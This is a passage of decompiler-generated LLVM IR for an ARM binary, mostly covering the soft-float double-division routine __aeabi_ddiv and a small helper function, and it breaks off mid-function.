  uselistorder i32 %v1_13050, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13044, { 1, 0 }
  uselistorder i32 %v2_13030, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1302c, { 1, 0 }
  uselistorder i32 %v4_1301c, { 1, 2, 0 }
  uselistorder i32 %v0_1301c, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 47, 48, 28, 29, 30, 0, 31, 5, 32, 16, 10, 11, 3, 35, 12, 8, 63, 64, 65, 66, 67, 68, 9, 69, 70, 71, 72, 73, 74, 13, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 14, 17, 20, 27, 18, 19, 38, 39, 40, 1, 21, 36, 6, 37, 7, 22, 2, 41, 15, 42, 43, 44, 45, 75, 4, 62, 33, 34, 23, 24, 25, 26, 46 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 10, 7, 11, 12, 8, 0, 9 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_13194(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13194:
  %v1_13198 = or i32 %arg1, 2146959360
  ret i32 %v1_13198
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_131a0 = load i32, i32* @r4, align 4
  store i32 %v3_131a0, i32* %stack_var_-16, align 4
  %v6_131a0 = load i32, i32* @r5, align 4
  %v9_131a0 = load i32, i32* @r6, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_131ac = load i32, i32* %r0.global-to-local, align 4
  %v4_131ac = udiv i32 %v1_131ac, 1048576
  %v5_131ac = urem i32 %v4_131ac, 2048
  store i32 %v5_131ac, i32* @r4, align 4
  %v6_131ac = icmp eq i32 %v5_131ac, 0
  br i1 %v6_131ac, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_131b0 = udiv i32 %arg3, 1048576
  %v6_131b0 = urem i32 %v5_131b0, 2048
  store i32 %v6_131b0, i32* %r5.global-to-local, align 4
  %v7_131b0 = icmp eq i32 %v6_131b0, 0
  br i1 %v7_131b0, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_13334

bb92:                                             ; preds = %bb
  %v5_131b4 = icmp eq i32 %v5_131ac, 2047
  br i1 %v5_131b4, label %.thread2, label %bb93

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %entry..thread2_crit_edge ], [ %v5_131b0, %bb92 ]
  br label %dec_label_pc_13334

bb93:                                             ; preds = %bb92
  %v5_131b8 = icmp eq i32 %v6_131b0, 2047
  br i1 %v5_131b8, label %dec_label_pc_13334, label %dec_label_pc_131c0

dec_label_pc_131c0:                               ; preds = %bb93
  %v2_131c0 = sub nsw i32 %v5_131ac, %v6_131b0
  store i32 %v2_131c0, i32* %r4.global-to-local, align 4
  %v2_131c4 = xor i32 %v1_131ac, %arg3
  %v4_131c8 = mul i32 %arg3, 4096
  %v5_131c8 = or i32 %v4_131c8, %arg4
  store i32 %v5_131c8, i32* %r5.global-to-local, align 4
  %v7_131c8 = icmp eq i32 %v5_131c8, 0
  %v3_131cc = mul i32 %v1_131ac, 4096
  store i32 %v3_131cc, i32* %r0.global-to-local, align 4
  br i1 %v7_131c8, label %dec_label_pc_13304, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %dec_label_pc_131c0
  %tmp94 = mul i32 %arg3, 256
  %v4_131dc = and i32 %tmp94, 268435200
  %v4_131e0 = udiv i32 %arg4, 16777216
  %v5_131dc = or i32 %v4_131e0, %v4_131dc
  %v5_131e0 = or i32 %v5_131dc, 268435456
  store i32 %v5_131e0, i32* %r2.global-to-local, align 4
  %v3_131e4 = mul i32 %arg4, 256
  store i32 %v3_131e4, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_131ac, 256
  %v4_131e8 = and i32 %tmp95, 268435200
  %v1_131ec = load i32, i32* @r1, align 4
  %v4_131ec = udiv i32 %v1_131ec, 16777216
  %v5_131e8 = or i32 %v4_131e8, %v4_131ec
  %v5_131ec = or i32 %v5_131e8, 268435456
  store i32 %v5_131ec, i32* %r5.global-to-local, align 4
  %v3_131f0 = mul i32 %v1_131ec, 256
  store i32 %v3_131f0, i32* %r6.global-to-local, align 4
  %v1_131f4 = and i32 %v2_131c4, -2147483648
  store i32 %v1_131f4, i32* %r0.global-to-local, align 4
  %v3_131f8 = icmp uge i32 %v5_131ec, %v5_131e0
  %v9_131f8 = icmp eq i32 %v5_131ec, %v5_131e0
  br i1 %v9_131f8, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_131d4
  %v4_131fc = icmp uge i32 %v3_131f0, %v3_131e4
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_131d4, %bb96
  %v1_13200 = phi i1 [ %v3_131f8, %dec_label_pc_131d4 ], [ %v4_131fc, %bb96 ]
  %v2_13200 = add nsw i32 %v2_131c0, 253
  %v3_13200 = zext i1 %v1_13200 to i32
  %v4_13200 = add nsw i32 %v2_13200, %v3_13200
  %v8_13200 = icmp ule i32 %v4_13200, %v2_131c0
  %v9_13200 = icmp ugt i32 %v2_131c0, -254
  %v10_13200 = select i1 %v1_13200, i1 %v8_13200, i1 %v9_13200
  %v1_13204 = add nsw i32 %v4_13200, 768
  store i32 %v1_13204, i32* %r4.global-to-local, align 4
  br i1 %v10_13200, label %dec_label_pc_13214, label %dec_label_pc_1320c

dec_label_pc_1320c:                               ; preds = %bb97
  %v3_1320c = udiv i32 %v5_131e0, 2
  store i32 %v3_1320c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13214

dec_label_pc_13214:                               ; preds = %bb97, %dec_label_pc_1320c
  %v0_1321c = phi i32 [ %v5_131e0, %bb97 ], [ %v3_1320c, %dec_label_pc_1320c ]
  %v0_13220 = phi i32 [ %v3_131e4, %bb97 ], [ 0, %dec_label_pc_1320c ]
  %v2_13214 = sub i32 %v3_131f0, %v0_13220
  store i32 %v2_13214, i32* %r6.global-to-local, align 4
  %v3_13214 = icmp uge i32 %v3_131f0, %v0_13220
  %v3_13218 = icmp eq i1 %v3_13214, false
  %v4_13218 = sub nsw i32 %v5_131ec, %v0_1321c
  %v6_13218 = sext i1 %v3_13218 to i32
  %v7_13218 = add nsw i32 %v6_13218, %v4_13218
  store i32 %v7_13218, i32* %r5.global-to-local, align 4
  %v3_1321c = udiv i32 %v0_1321c, 2
  store i32 %v3_1321c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1322c.outer

dec_label_pc_1322c.outer:                         ; preds = %dec_label_pc_132c4, %dec_label_pc_13214
  %v1_132d8.ph = phi i32 [ %v2_132c4, %dec_label_pc_132c4 ], [ %v1_131f4, %dec_label_pc_13214 ]
  %v0_13230.ph = phi i32 [ %v5_132a0, %dec_label_pc_132c4 ], [ %v7_13218, %dec_label_pc_13214 ]
  %v1_13234.ph = phi i32 [ %v3_132a4, %dec_label_pc_132c4 ], [ %v2_13214, %dec_label_pc_13214 ]
  %v5_132ac17.ph = phi i32 [ %v5_132ac, %dec_label_pc_132c4 ], [ %v3_1321c, %dec_label_pc_13214 ]
  %v3_132b013.ph = phi i32 [ %v3_132b0, %dec_label_pc_132c4 ], [ 0, %dec_label_pc_13214 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_132c4 ], [ 1048576, %dec_label_pc_13214 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_132c4 ], [ 524288, %dec_label_pc_13214 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1322c

dec_label_pc_1322c:                               ; preds = %dec_label_pc_1322c.outer, %dec_label_pc_1329c
  %v1_1329059 = phi i32 [ %v2_132d8, %dec_label_pc_1329c ], [ %storemerge136, %dec_label_pc_1322c.outer ]
  %v1_1323c = phi i32 [ %v1_1323c32, %dec_label_pc_1329c ], [ %storemerge136, %dec_label_pc_1322c.outer ]
  %v1_1325841 = phi i32 [ %v1_1325843, %dec_label_pc_1329c ], [ %storemerge136, %dec_label_pc_1322c.outer ]
  %v1_1327450 = phi i32 [ %v1_1327452, %dec_label_pc_1329c ], [ %storemerge136, %dec_label_pc_1322c.outer ]
  %v0_132b4 = phi i32 [ %v3_132b4, %dec_label_pc_1329c ], [ %storemerge, %dec_label_pc_1322c.outer ]
  %v0_13230 = phi i32 [ %v5_132a0, %dec_label_pc_1329c ], [ %v0_13230.ph, %dec_label_pc_1322c.outer ]
  %v1_13234 = phi i32 [ %v3_132a4, %dec_label_pc_1329c ], [ %v1_13234.ph, %dec_label_pc_1322c.outer ]
  %v5_132ac17 = phi i32 [ %v5_132ac, %dec_label_pc_1329c ], [ %v5_132ac17.ph, %dec_label_pc_1322c.outer ]
  %v3_132b013 = phi i32 [ %v3_132b0, %dec_label_pc_1329c ], [ %v3_132b013.ph, %dec_label_pc_1322c.outer ]
  %v3_1322c = icmp uge i32 %v1_13234, %v3_132b013
  %v3_13230 = icmp eq i1 %v3_1322c, false
  %v4_13230 = sub i32 %v0_13230, %v5_132ac17
  %v6_13230 = sext i1 %v3_13230 to i32
  %v7_13230 = add i32 %v6_13230, %v4_13230
  %v8_13230 = zext i1 %v3_13230 to i32
  %v9_13230 = sub i32 %v7_13230, %v8_13230
  %v10_13230 = icmp ult i32 %v0_13230, %v9_13230
  %v11_13230 = icmp ne i32 %v5_132ac17, -1
  %v12_13230 = or i1 %v11_13230, %v10_13230
  %v13_13230 = icmp ult i32 %v0_13230, %v5_132ac17
  %v14_13230 = select i1 %v3_13230, i1 %v12_13230, i1 %v13_13230
  br i1 %v14_13230, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_1322c
  %v3_13234 = sub i32 %v1_13234, %v3_132b013
  store i32 %v3_13234, i32* %r6.global-to-local, align 4
  store i32 %v7_13230, i32* %r5.global-to-local, align 4
  %v3_1323c = or i32 %v1_1323c, %v0_132b4
  store i32 %v3_1323c, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1322c, %bb98
  %v1_1329058 = phi i32 [ %v1_1329059, %dec_label_pc_1322c ], [ %v3_1323c, %bb98 ]
  %v1_1323c35 = phi i32 [ %v1_1323c, %dec_label_pc_1322c ], [ %v3_1323c, %bb98 ]
  %v1_13258 = phi i32 [ %v1_1325841, %dec_label_pc_1322c ], [ %v3_1323c, %bb98 ]
  %v1_1327449 = phi i32 [ %v1_1327450, %dec_label_pc_1322c ], [ %v3_1323c, %bb98 ]
  %v0_1324c = phi i32 [ %v0_13230, %dec_label_pc_1322c ], [ %v7_13230, %bb98 ]
  %v1_13250 = phi i32 [ %v1_13234, %dec_label_pc_1322c ], [ %v3_13234, %bb98 ]
  %v1_13240 = urem i32 %v5_132ac17, 2
  %v2_13240 = icmp ne i32 %v1_13240, 0
  %v3_13240 = udiv i32 %v5_132ac17, 2
  %v3_13244 = zext i1 %v2_13240 to i32
  %v6_13244 = zext i32 %v3_132b013 to i64
  %v7_13244 = sub i32 33, %v3_132b013
  %v8_13244 = zext i32 %v7_13244 to i64
  %v9_13244 = shl i64 %v6_13244, %v8_13244
  %v10_13244 = sub i32 32, %v3_132b013
  %v11_13244 = shl i32 %v3_13244, %v10_13244
  %v12_13244 = zext i32 %v11_13244 to i64
  %v14_13244 = or i64 %v12_13244, %v9_13244
  %v15_13244 = trunc i64 %v14_13244 to i32
  %v3_13248 = icmp uge i32 %v1_13250, %v15_13244
  %v3_1324c = icmp eq i1 %v3_13248, false
  %v4_1324c = sub i32 %v0_1324c, %v3_13240
  %v6_1324c = sext i1 %v3_1324c to i32
  %v7_1324c = add i32 %v6_1324c, %v4_1324c
  %v13_1324c = icmp ult i32 %v0_1324c, %v3_13240
  %v14_1324c = or i1 %v13_1324c, %v3_1324c
  br i1 %v14_1324c, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_13250 = sub i32 %v1_13250, %v15_13244
  store i32 %v3_13250, i32* %r6.global-to-local, align 4
  store i32 %v7_1324c, i32* %r5.global-to-local, align 4
  %v5_13258 = udiv i32 %v0_132b4, 2
  %v6_13258 = or i32 %v1_13258, %v5_13258
  store i32 %v6_13258, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1329057 = phi i32 [ %v1_1329058, %.thread4 ], [ %v6_13258, %bb99 ]
  %v1_1323c34 = phi i32 [ %v1_1323c35, %.thread4 ], [ %v6_13258, %bb99 ]
  %v1_1325845 = phi i32 [ %v1_13258, %.thread4 ], [ %v6_13258, %bb99 ]
  %v1_13274 = phi i32 [ %v1_1327449, %.thread4 ], [ %v6_13258, %bb99 ]
  %v0_13268 = phi i32 [ %v0_1324c, %.thread4 ], [ %v7_1324c, %bb99 ]
  %v1_1326c = phi i32 [ %v1_13250, %.thread4 ], [ %v3_13250, %bb99 ]
  %v1_1325c = urem i32 %v3_13240, 2
  %v2_1325c = icmp ne i32 %v1_1325c, 0
  %v3_1325c = udiv i32 %v5_132ac17, 4
  %v3_13260 = zext i1 %v2_1325c to i32
  %v6_13260 = and i64 %v14_13244, 4294967295
  %v7_13260 = sub i32 33, %v15_13244
  %v8_13260 = zext i32 %v7_13260 to i64
  %v9_13260 = shl i64 %v6_13260, %v8_13260
  %v10_13260 = sub i32 32, %v15_13244
  %v11_13260 = shl i32 %v3_13260, %v10_13260
  %v12_13260 = zext i32 %v11_13260 to i64
  %v14_13260 = or i64 %v12_13260, %v9_13260
  %v15_13260 = trunc i64 %v14_13260 to i32
  %v3_13264 = icmp uge i32 %v1_1326c, %v15_13260
  %v3_13268 = icmp eq i1 %v3_13264, false
  %v4_13268 = sub i32 %v0_13268, %v3_1325c
  %v6_13268 = sext i1 %v3_13268 to i32
  %v7_13268 = add i32 %v6_13268, %v4_13268
  %v13_13268 = icmp ult i32 %v0_13268, %v3_1325c
  %v14_13268 = or i1 %v13_13268, %v3_13268
  br i1 %v14_13268, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_1326c = sub i32 %v1_1326c, %v15_13260
  store i32 %v3_1326c, i32* %r6.global-to-local, align 4
  store i32 %v7_13268, i32* %r5.global-to-local, align 4
  %v5_13274 = udiv i32 %v0_132b4, 4
  %v6_13274 = or i32 %v1_13274, %v5_13274
  store i32 %v6_13274, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_13290 = phi i32 [ %v1_1329057, %.thread6 ], [ %v6_13274, %bb100 ]
  %v1_1323c33 = phi i32 [ %v1_1323c34, %.thread6 ], [ %v6_13274, %bb100 ]
  %v1_1325844 = phi i32 [ %v1_1325845, %.thread6 ], [ %v6_13274, %bb100 ]
  %v1_1327453 = phi i32 [ %v1_13274, %.thread6 ], [ %v6_13274, %bb100 ]
  %v0_13284 = phi i32 [ %v0_13268, %.thread6 ], [ %v7_13268, %bb100 ]
  %v1_13288 = phi i32 [ %v1_1326c, %.thread6 ], [ %v3_1326c, %bb100 ]
  %v1_13278 = urem i32 %v3_1325c, 2
  %v2_13278 = icmp ne i32 %v1_13278, 0
  %v3_13278 = udiv i32 %v5_132ac17, 8
  %v3_1327c = zext i1 %v2_13278 to i32
  %v6_1327c = and i64 %v14_13260, 4294967295
  %v7_1327c = sub i32 33, %v15_13260
  %v8_1327c = zext i32 %v7_1327c to i64
  %v9_1327c = shl i64 %v6_1327c, %v8_1327c
  %v10_1327c = sub i32 32, %v15_13260
  %v11_1327c = shl i32 %v3_1327c, %v10_1327c
  %v12_1327c = zext i32 %v11_1327c to i64
  %v14_1327c = or i64 %v12_1327c, %v9_1327c
  %v15_1327c = trunc i64 %v14_1327c to i32
  %v3_13280 = icmp uge i32 %v1_13288, %v15_1327c
  %v3_13284 = icmp eq i1 %v3_13280, false
  %v4_13284 = sub i32 %v0_13284, %v3_13278
  %v6_13284 = sext i1 %v3_13284 to i32
  %v7_13284 = add i32 %v6_13284, %v4_13284
  %v13_13284 = icmp ult i32 %v0_13284, %v3_13278
  %v14_13284 = or i1 %v13_13284, %v3_13284
  br i1 %v14_13284, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_13288 = sub i32 %v1_13288, %v15_1327c
  store i32 %v3_13288, i32* %r6.global-to-local, align 4
  store i32 %v7_13284, i32* %r5.global-to-local, align 4
  %v5_13290 = udiv i32 %v0_132b4, 8
  %v6_13290 = or i32 %v1_13290, %v5_13290
  store i32 %v6_13290, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_132a0 = phi i32 [ %v1_13288, %.thread8 ], [ %v3_13288, %bb102 ]
  %v0_1329c = phi i32 [ %v0_13284, %.thread8 ], [ %v7_13284, %bb102 ]
  %v2_132d8 = phi i32 [ %v1_13290, %.thread8 ], [ %v6_13290, %bb102 ]
  %v1_1323c32 = phi i32 [ %v1_1323c33, %.thread8 ], [ %v6_13290, %bb102 ]
  %v1_1325843 = phi i32 [ %v1_1325844, %.thread8 ], [ %v6_13290, %bb102 ]
  %v1_1327452 = phi i32 [ %v1_1327453, %.thread8 ], [ %v6_13290, %bb102 ]
  %v2_13294 = or i32 %v0_1329c, %v1_132a0
  %v4_13294 = icmp eq i32 %v2_13294, 0
  br i1 %v4_13294, label %dec_label_pc_132d4, label %dec_label_pc_1329c

dec_label_pc_1329c:                               ; preds = %.thread10
  %v3_1329c = mul i32 %v0_1329c, 16
  %v4_132a0 = udiv i32 %v1_132a0, 268435456
  %v5_132a0 = or i32 %v3_1329c, %v4_132a0
  store i32 %v5_132a0, i32* %r5.global-to-local, align 4
  %v3_132a4 = mul i32 %v1_132a0, 16
  store i32 %v3_132a4, i32* %r6.global-to-local, align 4
  %v3_132a8 = mul nuw i32 %v3_13278, 8
  %v4_132ac = udiv i32 %v15_1327c, 536870912
  %v5_132ac = or i32 %v4_132ac, %v3_132a8
  %v3_132b0 = mul i32 %v15_1327c, 8
  %v3_132b4 = udiv i32 %v0_132b4, 16
  store i32 %v3_132b4, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_132b4, 16
  br i1 %tmp, label %dec_label_pc_132bc, label %dec_label_pc_1322c

dec_label_pc_132bc:                               ; preds = %dec_label_pc_1329c
  %v1_132bc = and i32 %v1_132d8.ph, 1048576
  %v2_132bc = icmp eq i32 %v1_132bc, 0
  br i1 %v2_132bc, label %dec_label_pc_132c4, label %.thread11.loopexit

dec_label_pc_132c4:                               ; preds = %dec_label_pc_132bc
  %v2_132c4 = or i32 %v2_132d8, %v1_132d8.ph
  store i32 %v2_132c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1322c.outer

dec_label_pc_132d4:                               ; preds = %.thread10
  store i32 %v15_1327c, i32* %r3.global-to-local, align 4
  store i32 %v3_13278, i32* %r2.global-to-local, align 4
  %v1_132d4 = and i32 %v1_132d8.ph, 1048576
  %v2_132d4 = icmp eq i32 %v1_132d4, 0
  br i1 %v2_132d4, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_132d4
  %v3_132d8 = or i32 %v2_132d8, %v1_132d8.ph
  store i32 %v3_132d8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_132bc
  store i32 %v3_132b0, i32* %r3.global-to-local, align 4
  store i32 %v5_132ac, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_132d4, %bb103
  %v1_132e0 = add nsw i32 %v4_13200, 515
  store i32 %v1_132e0, i32* %ip.global-to-local, align 4
  %v2_132e0 = icmp ugt i32 %v1_13204, 252
  %v7_132e0 = icmp eq i32 %v1_13204, 253
  %v2_132e4 = xor i1 %v7_132e0, true
  %v3_132e4 = and i1 %v2_132e0, %v2_132e4
  br i1 %v3_132e4, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_132e4 = icmp ugt i32 %v1_132e0, 1791
  %v11_132e4 = icmp eq i32 %v1_132e0, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_132e8 = phi i1 [ %v7_132e0, %.thread11 ], [ %v11_132e4, %bb104 ]
  %v0_132e8 = phi i1 [ %v2_132e0, %.thread11 ], [ %v6_132e4, %bb104 ]
  %v2_132e8 = xor i1 %v1_132e8, true
  %v3_132e8 = and i1 %v0_132e8, %v2_132e8
  call void @__pseudo_cond_branch(i1 %v3_132e8, i32 ptrtoint (i32* @global_var_13018.766 to i32))
  %v0_132ec = load i32, i32* %r5.global-to-local, align 4
  %v1_132ec = load i32, i32* %r2.global-to-local, align 4
  %v2_132ec = sub i32 %v0_132ec, %v1_132ec
  store i32 %v2_132ec, i32* %ip.global-to-local, align 4
  %v3_132ec = icmp uge i32 %v0_132ec, %v1_132ec
  %v9_132ec = icmp eq i32 %v0_132ec, %v1_132ec
  br i1 %v9_132ec, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_132f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_132f0 = load i32, i32* %r3.global-to-local, align 4
  %v3_132f0 = sub i32 %v1_132f0, %v2_132f0
  store i32 %v3_132f0, i32* %ip.global-to-local, align 4
  %v4_132f0 = icmp uge i32 %v1_132f0, %v2_132f0
  %v10_132f0 = icmp eq i32 %v1_132f0, %v2_132f0
  br i1 %v10_132f0, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_132f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_132f4 = urem i32 %v1_132f4, 2
  %v3_132f4 = icmp ne i32 %v2_132f4, 0
  %v4_132f4 = udiv i32 %v1_132f4, 2
  store i32 %v4_132f4, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_132f8 = phi i1 [ %v3_132ec, %bb105 ], [ %v4_132f0, %bb106 ], [ %v3_132f4, %bb107 ]
  %v0_132f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_132f8 = zext i1 %v1_132f8 to i32
  %v3_132f8 = add i32 %v2_132f8, %v0_132f8
  store i32 %v3_132f8, i32* %r1.global-to-local, align 4
  %v0_132fc = load i32, i32* %r0.global-to-local, align 4
  %v1_132fc = load i32, i32* %r4.global-to-local, align 4
  %v2_132fc = and i32 %v1_132fc, 4096
  %v3_132fc = icmp ne i32 %v2_132fc, 0
  %v4_132fc = mul i32 %v1_132fc, 1048576
  %v6_132fc = add i32 %v4_132fc, %v0_132fc
  %v7_132fc = zext i1 %v3_132fc to i32
  %v8_132fc = add i32 %v7_132fc, %v6_132fc
  store i32 %v8_132fc, i32* %r0.global-to-local, align 4
  %v2_13300 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13300, i32* %r4.global-to-local, align 4
  store i32 %v6_131a0, i32* %r5.global-to-local, align 4
  store i32 %v9_131a0, i32* %r6.global-to-local, align 4
  ret i32 %v8_132fc

dec_label_pc_13304:                               ; preds = %dec_label_pc_131c0
  %v1_13304 = and i32 %v2_131c4, -2147483648
  %v4_13308 = urem i32 %v1_131ac, 1048576
  %v5_13308 = or i32 %v1_13304, %v4_13308
  store i32 %v5_13308, i32* %r0.global-to-local, align 4
  %v6_1330c = add nsw i32 %v2_131c0, 1023
  store i32 %v6_1330c, i32* %r4.global-to-local, align 4
  %v8_1330c = sub nsw i32 0, %v2_131c0
  %v9_1330c = and i32 %v6_1330c, %v8_1330c
  %v11_1330c = icmp slt i32 %v2_131c0, -1023
  %v12_1330c = icmp eq i32 %v6_1330c, 0
  %v7_13310 = icmp sgt i32 %v2_131c0, -1023
  br i1 %v7_13310, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_13304
  %v10_13310 = sub nsw i32 1024, %v2_131c0
  store i32 %v10_13310, i32* %r5.global-to-local, align 4
  %v14_13310 = and i32 %v10_13310, %v6_1330c
  %v16_13310 = icmp slt i32 %v10_13310, 0
  %v17_13310 = icmp eq i32 %v6_1330c, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_13304, %bb108
  %v2_13318.in = phi i32 [ %v9_1330c, %dec_label_pc_13304 ], [ %v14_13310, %bb108 ]
  %v1_13318 = phi i1 [ %v11_1330c, %dec_label_pc_13304 ], [ %v16_13310, %bb108 ]
  %v0_13318 = phi i1 [ %v12_1330c, %dec_label_pc_13304 ], [ %v17_13310, %bb108 ]
  %v2_13318 = icmp slt i32 %v2_13318.in, 0
  %v3_13314 = xor i1 %v2_13318, %v1_13318
  %v4_13314 = or i1 %v0_13318, %v3_13314
  br i1 %v4_13314, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_1331485 = mul i32 %v6_1330c, 1048576
  %v10_1331486 = or i32 %v9_1331485, %v5_13308
  store i32 %v10_1331486, i32* %r0.global-to-local, align 4
  store i32 %v3_131a0, i32* %r4.global-to-local, align 4
  store i32 %v6_131a0, i32* %r5.global-to-local, align 4
  ret i32 %v10_1331486

bb111:                                            ; preds = %bb109
  %v1_1331c = or i32 %v5_13308, 1048576
  store i32 %v1_1331c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_13324 = add nsw i32 %v2_131c0, 1022
  store i32 %v1_13324, i32* @r4, align 4
  %v3_13324 = sub nsw i32 -1023, %v2_131c0
  %v4_13324 = and i32 %v6_1330c, %v3_13324
  %v5_13324 = icmp slt i32 %v4_13324, 0
  store i1 %v5_13324, i1* @cpsr_v, align 1
  %v6_13324 = icmp slt i32 %v2_131c0, -1022
  store i1 %v6_13324, i1* @cpsr_n, align 1
  %v7_13324 = icmp eq i32 %v6_1330c, 1
  store i1 %v7_13324, i1* @cpsr_z, align 1
  %v1_13328 = call i32 @function_13018(i32 %v1_1331c)
  store i32 %v1_13328, i32* %r0.global-to-local, align 4
  %v0_1332c = load i32, i32* @r5, align 4
  %v1_1332c = load i32, i32* @r6, align 4
  %v2_1332c = or i32 %v1_1332c, %v0_1332c
  store i32 %v2_1332c, i32* @lr, align 4
  %v1_13330 = call i32 @function_13018(i32 %v1_13328)
  store i32 %v1_13330, i32* %r0.global-to-local, align 4
  %v0_13334.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_13338.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13334

dec_label_pc_13334:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_13334.pre-phi = phi i32 [ %v5_131b0, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_131b0, %bb93 ], [ %v5_131b0, %bb111 ]
  %v0_13338 = phi i32 [ %v5_131ac, %.thread1 ], [ %v5_131ac, %.thread2 ], [ %v5_131ac, %bb93 ], [ %v0_13338.pre, %bb111 ]
  %v2_1333c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_13334.pre, %bb111 ]
  %v5_13334 = and i32 %v2_1333c, %v4_13334.pre-phi
  store i32 %v5_13334, i32* @r5, align 4
  %v4_13338 = icmp eq i32 %v2_1333c, %v0_13338
  br i1 %v4_13338, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_13334
  %v5_1333c = icmp eq i32 %v5_13334, %v2_1333c
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_13334, %bb112
  %v0_13340 = phi i1 [ false, %dec_label_pc_13334 ], [ %v5_1333c, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_13340, i32 ptrtoint (i32* @global_var_13194.767 to i32))
  %v0_13344 = load i32, i32* @r4, align 4
  %v1_13344 = load i32, i32* %ip.global-to-local, align 4
  %v4_13344 = icmp eq i32 %v1_13344, %v0_13344
  br i1 %v4_13344, label %dec_label_pc_1334c, label %dec_label_pc_13368

dec_label_pc_1334c:                               ; preds = %bb113
  %v0_1334c = load i32, i32* @r1, align 4
  %v1_1334c = load i32, i32* %r0.global-to-local, align 4
  %v4_1334c = mul i32 %v1_1334c, 4096
  %v5_1334c = or i32 %v4_1334c, %v0_1334c
  store i32 %v5_1334c, i32* %r4.global-to-local, align 4
  %v1_13350 = icmp ne i32 %v5_1334c, 0
  call void @__pseudo_cond_branch(i1 %v1_13350, i32 ptrtoint (i32* @global_var_13194.767 to i32))
  %v0_13354 = load i32, i32* @r5, align 4
  %v1_13354 = load i32, i32* %ip.global-to-local, align 4
